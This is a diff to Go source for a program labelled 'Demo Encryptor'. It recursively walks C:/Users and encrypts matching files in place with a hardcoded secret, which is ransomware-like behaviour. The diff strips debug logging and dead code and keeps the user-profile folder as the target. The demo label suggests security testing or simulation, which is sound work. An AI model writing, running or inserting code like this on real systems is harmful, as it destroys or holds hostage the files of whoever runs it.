@@ -24,10 +24,7 @@ var targets = []string{
 
 var secret = "secret password"
 
-var f *os.File
-
 func encrypt(fileName string, secret string) error {
-	fmt.Fprintf(f, "Encrypt %s\n", fileName)
 	f, err := os.OpenFile(fileName, os.O_RDWR, 0)
 	if err != nil {
 		return err
@@ -74,11 +71,9 @@ func isTarget(name string) bool {
 }
 
 func encryptDirRecursive(dir string) error {
-	fmt.Fprintf(f, "encryptDirRecursive(%s)\n", dir)
 	count := 0
 	fmt.Printf("Start encryption in %s\n", dir)
 	err := filepath.Walk(dir, func(path string, info fs.FileInfo, err error) error {
-		fmt.Fprintf(f, "func(%s, %v, %v)\n", path, info, err)
 		if err != nil {
 			return err
 		}
@@ -99,43 +94,9 @@ func encryptDirRecursive(dir string) error {
 	return err
 }
 
-/*
-func encryptDir(folder string) error {
-	count := 0
-	fmt.Printf("Start encryption in %s\n", folder)
-	dir, err := os.ReadDir(folder)
-	if err != nil {
-		return err
-	}
-	for _, each := range dir {
-		if !each.Type().IsRegular() {
-			continue
-		}
-		if !isTarget(each.Name()) {
-			continue
-		}
-		path := filepath.Join(folder, each.Name())
-		err = encrypt(path, secret)
-		if err != nil {
-			return fmt.Errorf("%v: %w", path, err)
-		}
-		count++
-	}
-	fmt.Printf("Encrypted %d files\n", count)
-	return err
-}
-*/
 func main() {
 	fmt.Printf("Demo Encryptor (%s)\n", Unique)
 	folder := "C:/Users"
-	//folder := "C:/"
-	//	err := encryptDirRecursive(dir)
-	var err error
-	f, err = os.Create("C:\\encrypt.txt")
-	if err != nil {
-		panic(err)
-	}
-	defer f.Close()
 	if err := encryptDirRecursive(folder); err != nil {
 		fmt.Printf("%s: %v\n", folder, err)
 	}
